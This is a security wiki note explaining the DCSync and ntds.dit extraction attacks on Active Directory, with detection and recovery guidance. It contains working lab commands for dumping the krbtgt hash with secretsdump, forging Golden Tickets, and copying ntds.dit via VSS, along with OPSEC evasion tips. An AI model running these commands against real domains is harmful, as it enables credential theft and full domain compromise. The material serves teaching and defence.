---
migration_source: published-html-snapshot
migration_status: needs-editorial-review
---

# DCSync and ntds.dit Extraction

## Definition

DCSync is an AD credential-extraction attack where the attacker abuses the **`DS-Replication-Get-Changes-All`** and related directory-replication rights to make their host act like a Domain Controller and request replicated copies of password hashes for any principal in the domain — including the **`krbtgt` account**, whose hash is the master key Kerberos uses to encrypt every Ticket Granting Ticket. **ntds.dit extraction** is the offline variant: copying the AD database file and SYSTEM registry hive from a DC (or its backups) to recover the same hashes without using the replication protocol. Both produce identical output: the NTLM hashes and AES keys of every account in the domain, which is the canonical *endgame* of an AD compromise.

## Why it matters

DCSync is what makes "compromised an admin once" become "perpetual control of the domain". Recovery of the `krbtgt` hash enables **Golden Tickets** — attacker-forged TGTs valid for any user in any group, defaulting to a 10-year lifetime. Recovery of a service-account hash enables **Silver Tickets** — service-scoped TGS forgeries. Recovery of every user's NTLM hash enables Pass-the-Hash lateral movement domain-wide.

The attack matters as a teaching note because it surfaces three uncomfortable facts about AD:

- **AD replication itself is the attack surface.** DCSync is not exploiting a vulnerability — it is using the documented replication protocol the way two DCs use it every minute. The bug is who has the rights, not what the protocol does.
- **`krbtgt` is the most valuable single secret in any AD environment.** Microsoft's recommendation is that `krbtgt` be rotated *twice in sequence* (with replication wait between) after any suspected compromise. Most environments have never rotated it.
- **DCSync is the cleanest connection point between the existing AD notes in this branch.** [[bloodhound-attack-path-analysis|BloodHound]] surfaces principals with DCSync rights; [[kerberoasting|Kerberoasting]] and [[as-rep-roasting|AS-REP Roasting]] frequently land in service accounts that already have replication rights via legacy Exchange or operator delegations.

## How it works

DCSync reduces to **4 steps**:

1. **Identify a principal with replication rights.** Required ACEs on the domain object: `DS-Replication-Get-Changes` (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`). Domain Controllers and Domain Admins have these by design; the attack works when *other* principals also have them — usually via legacy Exchange installation, Azure AD Connect, or mistaken delegations. BloodHound's pre-built query "Find Principals with DCSync Rights" is the canonical enumeration.
2. **Authenticate as the privileged principal.** Either by having their credential directly, by recovering their hash via Pass-the-Hash, or by Kerberoasting/AS-REP-roasting their account (the typical chain).
3. **Issue the replication RPC.** Tools call the `IDL_DRSGetNCChanges` opcode of the `DRSUAPI` RPC interface (MS-DRSR — Directory Replication Service Remote Protocol). The DC obliges because the caller has the right ACEs. Returns the NTLM hash, AES128/AES256 keys, and password history for the requested principal.
4. **Forge tickets and pivot.** With `krbtgt` hash → Golden Ticket (any-user TGT). With a service account hash → Silver Ticket (service-scoped TGS). With user hashes → Pass-the-Hash lateral movement to any host where the user's credential is accepted.

A representative end-to-end sequence from a Linux foothold:

```
# After Kerberoasting yielded a service account with replication rights:
impacket-secretsdump LAB.LOCAL/svc_replication:'CrackedPassword!'@10.0.0.1 \
    -just-dc-user krbtgt
# Output:
#   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
#   Kerberos keys grabbed: aes256-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96, des-cbc-md5
```

**ntds.dit extraction** is the offline variant — same output, different precondition:

1. Code execution and admin rights on a Domain Controller (or access to DC backups, VSS snapshots, or a restored copy).
2. Copy `C:\Windows\NTDS\ntds.dit` (the ESE database holding all AD data) plus the SYSTEM registry hive (`HKLM\SYSTEM` — needed for the bootkey that decrypts the database).
3. Parse offline with `secretsdump -ntds ntds.dit -system SYSTEM LOCAL` or DIT-snapshot tools.
4. Output identical to DCSync: every hash, every key.

The bug is not "AD replication is broken"; it is *the replication protocol is the canonical way to read every password hash in the domain, and access to it is governed by ACEs that frequently get over-granted and rarely get audited*.

## Techniques / patterns

- **Always BloodHound the path first.** `MATCH (n)-[r:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN n.name`. The hit list should contain Domain Controllers and Domain Admins. Anything else is a misconfiguration AND your shortest path to endgame.
- **`-just-dc` vs `-just-dc-user`.** `secretsdump.py -just-dc <target>` dumps **every** hash in the domain — loud and OPSEC-poor. `-just-dc-user krbtgt` dumps only the named account — minimal request, much quieter. Senior usage extracts only what is needed for the next step.
- **Exchange installations are a recurring source of unintended DCSync principals.** Installing Exchange historically granted `Exchange Trusted Subsystem`, `Exchange Windows Permissions`, and related groups with elevated AD rights including (in pre-2019 versions) effective DCSync. Audit those groups.
- **The `krbtgt` rotation is non-negotiable after compromise.** Twice, in sequence, with replication-wait between rotations. One rotation invalidates only the *previous* `krbtgt` key — attackers can still forge with the older key until the second rotation pushes it out of the password history window.
- **ntds.dit extraction from VSS is a stealth alternative.** `vssadmin create shadow /for=C:` → mount shadow → copy ntds.dit + SYSTEM hive → parse offline. Avoids the DRSUAPI RPC entirely, so DCSync detection rules miss it. Trade-off: requires code exec on the DC, which has its own telemetry.
- **OPSEC: DCSync is loud by default.** Every `IDL_DRSGetNCChanges` call lands in Event 4662 on the DC, with a recognizable GUID. Senior operators perform DCSync exactly once per engagement, against one or two specific accounts, and never as a routine reconnaissance step.

## Variants and bypasses

DCSync-class credential extraction has **4 important variants**.

### 1. Classic DCSync via DRSUAPI

The flow described above. Mimikatz `lsadump::dcsync /domain:lab.local /user:krbtgt` (Windows) or Impacket `secretsdump.py -just-dc-user krbtgt` (Linux). Requires `DS-Replication-Get-Changes-All` on the domain object. The default and most-detected variant.

### 2. ntds.dit + SYSTEM hive extraction

Offline, no DRSUAPI traffic. Requires code execution on a DC (or access to its backup). Often performed via `ntdsutil`, `vssadmin`, or by copying the files directly when the DC is offline. Avoids the canonical DCSync detection rule.

### 3. DCShadow

Different attack, same family. Instead of *requesting* replicated data, the attacker *registers their host as a Domain Controller* and *pushes* changes into AD that the real DCs accept as legitimate replication. Used for stealthy persistence — e.g., adding `DS-Replication-Get-Changes-All` to a low-privilege backdoor account, then walking back the DCShadow registration so no permanent DC entry exists. Far harder to detect than classic DCSync.

### 4. Cross-domain DCSync via trusts

In multi-domain forests with two-way transitive trusts, DCSync rights in one domain sometimes grant effective replication in another. Environment-specific; valuable in red-team scenarios against acquired-but-not-merged forests.

## Impact

Ordered by typical real-world severity:

- **Permanent domain compromise via Golden Ticket.** The defining impact. Recovered `krbtgt` hash allows the attacker to forge TGTs valid for any principal in any group, default lifetime 10 years, with the TGT itself accepted offline by any KDC in the domain. See [[golden-ticket-and-krbtgt-compromise|Golden Ticket and KRBTGT Compromise]] for the trust-root abuse model.
- **Forest-wide compromise via cross-domain trusts.** If the compromised domain is in a forest with a trusted root domain, Golden Tickets in the child domain often impersonate enterprise-admin-equivalent identities forest-wide.
- **Pass-the-Hash lateral movement to every endpoint.** Recovered NTLM hashes work directly with SMB, WinRM, RDP (via restricted-admin), MSSQL, and any service that trusts NTLM. The attacker can effectively log in as any user without ever knowing a plaintext password.
- **Silver Tickets for stealthy service-specific persistence.** Service account hash → [[silver-ticket-and-service-account-persistence|service-scoped TGS forgery]]. No DC contact required after the initial DCSync, so persistence survives even if the original DCSync principal is remediated.
- **Total loss of forensic ground truth.** Once `krbtgt` is compromised, every authentication event in the domain is forensically suspect. Incident response must assume any user could be impersonated and any session forged.

## Detection and defense

Ordered by effectiveness:

1.
**Audit `DS-Replication-Get-Changes-*` ACEs quarterly via BloodHound.**
   The hard fix. Query `MATCH (n)-[:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN n.name`. The result list should contain Domain Controllers and Domain Admins. Every other principal is a finding — investigate the grant history, revoke if not justified. Pair with [[bloodhound-attack-path-analysis|BloodHound]]'s defensive-review cadence.

2.
**Behavioral detection on Event ID 4662 with the replication GUIDs.**
   The DC logs Event 4662 on every `IDL_DRSGetNCChanges`. Filter for `{Properties[8]}` containing `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes) or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes-All). Detection rule: any source that is **not** a Domain Controller computer-account performing these requests is a high-confidence alert. False positives are essentially zero in a healthy environment.

3.
**Rotate `krbtgt` twice annually as standard hygiene — and twice in sequence immediately after any suspected compromise.**
   Once-per-year `krbtgt` rotation shortens the Golden Ticket window. The twice-in-sequence rotation (with replication-wait between) is what fully invalidates a leaked hash because the password history retains the previous hash. Microsoft publishes a `krbtgt` reset script; use it.

4.
**Detect ntds.dit access on Domain Controllers.**
   The offline variant skips DRSUAPI but requires file-level access to `ntds.dit` or VSS shadow operations. EDR rules on `vssadmin create shadow`, on direct opens of `C:\Windows\NTDS\ntds.dit`, and on `ntdsutil` invocations catch this variant.

5.
**Implement [Tier 0 administration](https://learn.microsoft.com/en-us/security/privileged-access-workstations/) and Privileged Access Workstations.**
   The structural defense. If DCSync-capable accounts never log in to lower-tier hosts, their credentials cannot be stolen via Pass-the-Hash, Mimikatz from LSASS, or Kerberoasting. Tier isolation is what prevents the chain that ends at DCSync from ever forming.

6.
**Honey-principal high in the graph.**
   Plant an attractively-named account (e.g., `bkp_replication_svc`) with `DS-Replication-Get-Changes-All` and *no other production purpose*. Any DCSync attempt against the domain by this account is unambiguously malicious. Asymmetric, high-fidelity, near-zero false-positive defense.

### What does not work as a primary defense

- **Trusting that "only DCs have replication rights".** Verify with the BloodHound query above. The Exchange-installation grants alone routinely add multiple unexpected principals.
- **Rotating `krbtgt` once.** The password history keeps the previous hash valid. One rotation is not enough.
- **Network-level blocks on DRSUAPI.** DCs must be able to replicate; blocking the protocol breaks the directory. The defense is at the ACE layer.
- **Renaming `krbtgt`.** Cannot be renamed; the SAM account name is structural. Don't try.
- **Disabling Mimikatz.** DCSync is implemented in many tools (Impacket, Rubeus, custom code, Cobalt Strike). Binary-name detection is trivially bypassed.

## Practical labs

Run only against owned lab environments or authorized engagements. DCSync against production AD without authorization is a serious offense.

```
# Lab 1 — Identify DCSync-capable principals in a lab AD via BloodHound Cypher.
# After running bloodhound-python -c All against the lab:
# In the BloodHound UI's Cypher box:
MATCH (n)-[r:DCSync|GetChanges|GetChangesAll]->(:Domain)
RETURN DISTINCT n.name AS principal, labels(n)[0] AS type
# DCs and Domain Admins should appear. Any other principal is a finding.
```

```
# Lab 2 — DCSync the krbtgt hash from a Linux host with admin creds.
impacket-secretsdump LAB.LOCAL/Administrator:'AdminPass!'@10.0.0.1 \
    -just-dc-user krbtgt
# Expected output:
#   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH:::
#   Kerberos keys grabbed: aes256-cts, aes128-cts, des-cbc-md5
```

```
# Lab 3 — Forge a Golden Ticket from the lab krbtgt hash.
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid S-1-5-21-<LAB-DOMAIN-SID> \
    -domain LAB.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec LAB.LOCAL/Administrator@DC01.lab.local -k -no-pass
# A working shell as Administrator without using any real credential.
```

```
# Lab 4 — ntds.dit extraction via VSS (run on a lab DC with admin).
vssadmin create shadow /for=C:
# Note the Shadow Copy Volume path from the output.
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\extract\
reg save HKLM\SYSTEM C:\extract\SYSTEM
# Then parse offline on the attacker host:
impacket-secretsdump -ntds C:\extract\ntds.dit -system C:\extract\SYSTEM LOCAL
```

```
# Lab 5 — Defender-side detection: Event 4662 with replication GUIDs.
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662} -MaxEvents 200 |
    Where-Object {
        $_.Properties[8].Value -match '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or
        $_.Properties[8].Value -match '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
    } |
    Select-Object TimeCreated, @{n='Subject';e={$_.Properties[3].Value}}, @{n='SourceIP';e={$_.Properties[10].Value}}
# Build a SIEM rule: alert if Subject is NOT a Domain Controller computer-account.
```

```
# Lab 6 — Twice-in-sequence krbtgt rotation (the recovery move).
# Microsoft publishes the New-KrbtgtKeys.ps1 script. The procedure:
.\New-KrbtgtKeys.ps1   # First rotation
# Wait at least 10 hours (default replication interval + Kerberos cache lifetime).
.\New-KrbtgtKeys.ps1   # Second rotation
# After this, any Golden Ticket forged with a previously-leaked hash is invalid.
```

## Practical examples

- **Engagement endgame from Kerberoasting.** Operator Kerberoasts `svc_replication` (a 2017-era service account with `GenericAll` on the domain object granted by mistake). Cracks the password, performs DCSync of `krbtgt`, forges a Golden Ticket for `Domain Admin`. Total chain: phish → Kerberoast → DCSync → Golden Ticket. 6 hours.
- **Exchange-installation legacy finding.** Defender quarterly review shows that `Exchange Trusted Subsystem` has effective DCSync via inherited permissions added in a 2015 Exchange installation. The Exchange server was decommissioned in 2020 but the group memberships persist. One ACE removal eliminates the path.
- **DCSync detection catches a red team.** Defender alerts on `Event 4662` with the replication GUIDs from a non-DC source IP. Within minutes the SOC traces the source to a workstation in the IT department, locks the user account, and ends the engagement. The detection rule fired on the first DCSync call.
- **Post-incident `krbtgt` rotation finding.** IR team confirms compromise of a Domain Admin two weeks ago. Single `krbtgt` rotation was performed at the time. Subsequent forensics reveals attacker-forged TGTs valid for the entire intervening period because the password history retained the leaked hash. The twice-in-sequence rotation was the missing step.
- **ntds.dit extraction via VSS evades DRSUAPI detection.** Red team avoids the canonical DCSync detection by VSS-snapshotting the DC, copying `ntds.dit` and the SYSTEM hive, and parsing offline. The detection rule on `Event 4662` produces zero hits. Defender catch happens (or doesn't) on `vssadmin create shadow` telemetry instead.

## Related notes

- [[kerberoasting]] — the typical *predecessor* attack: Kerberoasting frequently yields a service account with DCSync rights.
- [[as-rep-roasting]] — same family, alternative path to a credential that may have replication rights.
- [[bloodhound-attack-path-analysis]] — the targeting tool; its pre-built "Principals with DCSync Rights" query is the canonical enumeration step.
- [[golden-ticket-and-krbtgt-compromise]] — the natural post-DCSync Kerberos trust-root abuse path after `krbtgt` material is recovered.
- [[krbtgt-rotation-and-tier-zero-recovery]] — the recovery operation required when DCSync may have exposed `krbtgt`.
- [[silver-ticket-and-service-account-persistence]] — the service-account ticket-forgery path when DCSync recovers service keys rather than only `krbtgt`.
- [[pass-the-hash-and-ntlm-credential-reuse]] — the direct credential-reuse path after DCSync returns NTLM hashes.
- [[cia-triad-and-what-it-actually-decides|CIA triad]] — DCSync is a confidentiality breach (mass hash exposure) followed by integrity + authenticity breach (forged tickets impersonating any principal).
- [[attacker-defender-duality-as-a-learning-tool|Attacker-Defender Duality]] — the same `MATCH (n)-[:DCSync]->(:Domain)` Cypher query is used by both attackers (find targets) and defenders (find findings).
- [[behavioral-detection-vs-signature-detection|Behavioral vs signature detection]] — DCSync detection is purely behavioral (legitimate replication vs anomalous replication source).
- [[password-hashing|Password hashing]] — NTLM is unsalted MD4; the entire DCSync threat model assumes attackers can use these hashes directly via Pass-the-Hash.

### Suggested future atomic notes

- dcshadow-and-rogue-dc-attacks — the stealthy DCSync sibling.
- exchange-ad-permission-legacy-issues — the recurring source of misconfigured replication rights.
- [[detect-dcsync-and-ntdsdit-access]] — defender-side playbook pair.

## References

- **Foundational:** MITRE ATT&CK T1003.006 — OS Credential Dumping: DCSync — https://attack.mitre.org/techniques/T1003/006/
- **Research / Deep Dive:** Sean Metcalf (ADSecurity.org) — Mimikatz DCSync Usage, Exploitation, and Detection — https://adsecurity.org/?p=1729
- **Foundational:** Microsoft — AD DS Replication permissions and how to audit them — https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/ad-replication-event-id-1864
